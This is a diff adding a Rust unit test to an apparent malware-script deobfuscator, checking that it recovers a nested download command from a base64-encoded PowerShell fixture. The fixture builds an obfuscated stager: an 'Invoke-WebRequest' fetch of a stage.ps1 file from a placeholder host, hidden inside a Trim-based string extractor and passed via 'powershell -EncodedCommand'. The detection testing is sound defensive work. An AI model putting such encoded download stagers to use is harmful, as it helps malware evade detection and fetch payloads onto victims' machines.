@@ -15506,6 +15506,38 @@ Clean '~~~{decoded}~~~' '~'"#
     }
 
     #[test]
+    fn ps1_literal_trim_extractor_named_args_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-trim-named-args-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($value,$chars) {{
+  return $value.Trim($chars)
+}}
+Clean -chars '~' -value '~~~{decoded}~~~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-trim-named-args-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal trim extractor named-args call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_literal_trimstart_extractor_call_recovers_nested_command() {
         use base64::Engine;
 
